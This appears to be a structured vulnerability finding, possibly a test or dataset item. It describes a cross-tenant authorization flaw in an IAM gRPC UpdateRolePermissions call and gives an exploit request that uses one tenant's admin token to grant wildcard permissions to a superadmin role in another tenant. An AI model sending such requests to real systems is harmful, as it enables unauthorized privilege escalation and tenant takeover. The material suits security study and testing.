diagnosis: The UpdateRolePermissions RPC trusts the tenant_id in the request payload to update security role permissions. An administrator of a low-privilege tenant can craft a request targeting an enterprise tenant ID, granting themselves or victim roles wildcard administrative permissions across another tenant's environment.
exploit_request:
GRPC /iam.v1.PolicyService/UpdateRolePermissions
Host: iam-grpc.corp.net:443
Metadata: authorization: Bearer tenant_b_admin_token

{"tenant_id": "tenant_enterprise_44", "role_id": "role_superadmin", "permissions": ["*"]}
